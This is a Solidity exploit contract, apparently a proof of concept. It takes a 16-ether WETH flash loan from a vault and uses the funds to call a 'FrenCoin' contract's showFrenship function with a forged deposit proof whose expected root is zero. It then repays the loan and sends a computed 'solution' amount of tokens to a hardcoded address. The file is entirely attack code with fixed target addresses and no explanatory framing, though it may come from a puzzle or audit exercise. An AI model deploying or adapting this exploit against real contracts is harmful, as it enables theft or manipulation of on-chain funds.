pragma solidity 0.8.20;

interface IVault {
  function flashLoan(
    address recipient,
    address[] memory tokens,
    uint256[] memory amounts,
    bytes memory userData
  ) external;
}


struct DepositProof {
    uint256 blockNum;
    uint256 txIdx;
    uint256 logIdx;
    bytes32 expectedRoot;
    bytes proof;
}

interface IFrenCoin {
  function showFrenship(address creator, address prover, DepositProof calldata proof) external payable;
  function transfer(address, uint256) external returns (bool);
}

interface IWETH {
  function deposit() external payable;
  function withdraw(uint wad) external;
  function transfer(address, uint256) external returns (bool);
}

contract Exp {
  address constant vault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
  address constant coin = 0x61540c68eC23Cd984D9661b09ecE7016a0Ae2eeA;
  address constant creator = 0x87176364A742aa3cd6a41De1A2E910602881AB7d;
  address constant prover = 0xED12949e9a2cF4D86a2d0cF930247214Ea84aA4e;
  address constant weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

  function run(bytes memory proof) public {
    address[] memory tokens = new address[](1);
    uint256[] memory amounts = new uint256[](1);
    tokens[0] = weth;
    amounts[0] = 16 ether;

    IVault(vault).flashLoan(
      address(this),
      tokens,
      amounts,
      proof
    );

  }
  function receiveFlashLoan(
      address[] memory tokens,
      uint256[] memory amounts,
      uint256[] memory feeAmounts,
      bytes memory userData
  ) external {
    require(msg.sender == vault);
    IWETH(weth).withdraw(16 ether);


    DepositProof memory dp;
    dp.blockNum = 18600833;
    dp.txIdx = 207;
    dp.logIdx = 0;
    dp.expectedRoot = bytes32(0x00);
    dp.proof = userData;
    IFrenCoin(coin).showFrenship{value: 16 ether}(creator, prover, dp);

    IWETH(weth).deposit{value: 16 ether}();
    IWETH(weth).transfer(vault, 16 ether);

    uint256 solution  = uint256(uint128(uint256(keccak256(abi.encode(uint256(uint160(creator)))))));
    IFrenCoin(coin).transfer(creator, solution);
  }

  receive() external payable {}
}
